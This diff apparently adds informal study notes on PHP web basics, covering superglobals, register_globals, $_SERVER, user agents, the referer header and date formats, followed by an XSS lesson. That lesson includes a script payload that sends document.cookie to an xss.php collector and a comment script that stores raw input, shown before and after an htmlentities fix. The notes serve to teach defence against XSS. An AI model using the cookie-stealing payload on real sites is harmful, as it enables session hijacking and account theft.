@@ -1,0 +1,72 @@
+1.nl2br
+--------------------------------------------------------------------------------
+2. getenv
+---------------------------------------------------------------------------------
+3. simple way to get ip address is to use $ipaddress = $_SERVER['REMOTE_ADDR']
+but this does not work for the cases where the user is hiding behind a proxy server
+4. The first one getenv() is used to get the values from PHP’s environment variables and the second one $_SERVER is used to get the values from the web server (e.g. apache).
+----------------------------------------------------------------------------------
+register globals:
+Global variables in php are variables that are always accessible. They are also known as superglobals. They are built in variables that are always available regardless of the scope.
+
+There are nine superglobal variables in PHP. Some of these are relevant to this discussion.
+
+$_REQUEST
+$_POST
+$_GET
+$_COOKIE
+Now, let's focus on the $_REQUEST superglobal. It is used to collect data after submitting an HTML form by user using the POST method.
+
+$_POST and $_REQUEST could be used loosely interchangeably. But $_REQUEST also contains $_GET and $_COOKIE along with $_POST so you are never sure if your data came from a web form.
+
+Now, as pointed out by @Tim register_globals is an internal PHP setting which registers the $_REQUEST array's elements as variables. It is also known as a flag in your php setting. It is typically set in the PHP configuration file known as php.ini file. This setting can have two values.
+
+“on”
+“off”.
+An “on” value means that PHP will automatically create global variables for many server variables as well as query string parameters. This is not good and is a security risk.
+
+----------------------------------------------------
+$_SERVER is an array containing information such as headers, paths, and script locations. The entries in this array are created by the web server. There is no guarantee that every web server will provide any of these; servers may omit some, or provide others not listed here. That said, a large number of these variables are accounted for in the » CGI/1.1 specification, so you should be able to expect those.
+-----------------------------------------------------------------------------
+The user agent string is a text that the browsers themselves send to the webserver to identify themselves, so that websites can send different content based on the browser or based on browser compatibility.
+
+Mozilla is a browser rendering engine (the one at the core of Firefox) and the fact that Chrome and IE contain the string Mozilla/4 or /5 identifies them as being compatible with that rendering engine.
+-------------------------------------------------------
+When a web browser moves from one website to another and between pages of a website, it can optionally pass the URL it came from. This is called the HTTP_REFERER.
+----------------------------------------------------
+date ("l dS of F Y h:i:s A")
+l = textual representation of day
+d = day of the month
+S = nd,rd,th suffix
+F - textual representation of month
+Y - 4 digit year
+h,i,s: hours(12 hour),min, sec with leading zero
+A: am/pm
+-----------------------------------------------------------------
+TYPE:  <script type = "text/javascript"> location.href = 'http://localhost/xss.php?cookie='+document.cookie; </script> 
+
+BEFORE:
+<?php if( isset($_POST['content']))
+{
+    $fp = fopen('comments.txt','a'); //open a file comments.txt in append mode
+    fwrite($fp, $_POST['content'] . "<hr/> \n"); //writing the content from the textbox
+    fclose($fp);
+}
+echo nl2br(file_get_contents('comments.txt')); //nl2br: new line to break rule 
+?>   
+
+AFTER:
+<?php if( isset($_POST['content']))
+{
+    $c = htmlentities($_POST['content']);
+    $fp = fopen('comments.txt','a'); //open a file comments.txt in append mode
+    fwrite($fp, $c. "<hr/> \n"); //writing the content from the textbox
+    fclose($fp);
+}
+echo nl2br(file_get_contents('comments.txt')); //nl2br: new line to break rule 
+?>   
+
+1. $c = htmlentities($_POST['content'])
+2. $c = strip_tags($_POST['content'])
+3. $c = strip_tags($_POST['content'],"<i>")
+4. $c = htmlentities(strip_tags($_POST['content']))
